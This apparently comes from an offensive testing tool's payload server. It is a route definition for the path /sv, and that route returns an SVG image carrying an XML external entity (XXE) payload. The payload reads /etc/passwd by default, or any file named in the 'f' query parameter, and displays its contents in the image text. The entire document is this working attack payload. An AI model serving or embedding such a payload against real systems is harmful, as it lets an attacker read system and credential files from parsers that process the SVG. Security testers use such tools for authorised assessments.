---
title: XXE SVG Request Params
description: Returns an SVG payload with XXE to get files
weight: 1
pattern: /sv$
is_final: true
data:
  headers:
    Content-Type: image/svg+xml
  body: |
    {{- $file := "file:///etc/passwd" }}
    {{- if .Request.GetParams.f }}
    {{- $file = (index .Request.GetParams.f 0) }} 
    {{- end -}}
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "{{ $file }}" > ]>
    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
    </svg>

---

### /sv

attempts to get whatever files is supplied via the `f` query parameter
